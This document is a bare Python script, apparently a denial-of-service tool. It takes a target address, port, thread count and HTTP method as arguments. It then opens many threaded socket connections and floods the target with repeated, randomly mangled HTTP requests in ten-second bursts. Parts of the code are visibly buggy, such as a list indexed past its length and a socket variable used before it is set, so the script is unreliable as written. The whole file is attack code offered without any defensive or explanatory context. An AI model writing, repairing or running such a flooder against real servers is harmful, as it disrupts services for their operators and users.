import socket, time, string, random, threading, sys

elevation = 0

def logic(p,addr):
    global elevation
    for _ in range(2500):
        if elevation == 0:
            break
        try:
            s.sendall(p); s.send(p)
        except:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(addr); s.connect_ex(addr)
            except:pass

def senting(s,pkt,addr):
    global elevation
    path = ['*','?','!','_',':']
    p = (pkt%(path[0],path[1],path[2],path[3],path[4])).encode()
    bytes_end = ["\a","\b","\f","\n","\r","\t","\v"]
    while True:
        try:
            if elevation == 1:
                threading.Thread(target=logic,args=(p,addr)).start()
            elif elevation == 2:
                break
            else:
                path = [random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(1)]
                p = (pkt%(path[0],path[1],path[2],path[3],path[4])).replace('\n\n\r\r',''.join([random.choice((bytes_end)) for _ in range(4)])).encode()
                time.sleep(1)
        except:
            try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(addr); s.connect_ex(addr)
            except:
             pass

def http(addr,pkt):
    for _ in range(250):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(addr)
            s.connect_ex(addr)
            threading.Thread(target=senting,args=(s,pkt,addr)).start()
        except:
            pass

method = sys.argv[4]
addr = (sys.argv[1],int(sys.argv[2]))
thread = int(sys.argv[3])

pkt = (f'{method} /%s HTTP/1.1\nHost: {addr[0]}\n\n\r\r'*5)
for _ in range(thread):
    threading.Thread(target=http,args=(addr,pkt)).start()

while True:
    try:
        elevation = 1
        time.sleep(10)
        elevation = 0
    except KeyboardInterrupt:
        elevation = 2
